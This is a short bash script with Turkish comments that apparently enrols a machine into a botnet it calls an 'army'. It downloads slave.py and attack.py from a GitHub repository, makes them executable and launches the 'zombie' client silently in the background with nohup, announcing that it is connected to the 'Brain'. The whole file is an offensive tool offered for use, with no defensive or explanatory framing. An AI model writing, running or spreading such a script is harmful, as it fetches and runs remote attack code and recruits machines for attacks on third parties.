#!/bin/bash
echo "🚀 Orduya yeni nefer katılıyor..."
# Sistem güncelleme ve Python paketleri
sudo apt update -y && sudo apt install python3 python3-pip wget -y
python3 -m pip install requests flask

# Dosyaları GitHub'dan çek (Kendi linklerinle güncelle kanka)
wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/slave.py
wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py

# Dosyalara çalıştırma izni ver (./attack şeklinde kullanabilmek için)
chmod +x attack.py slave.py

# Arka planda zombiyi başlat
nohup python3 slave.py > /dev/null 2>&1 &

echo "✅ Kurulum bitti! Zombi Beyin'e bağlandı."
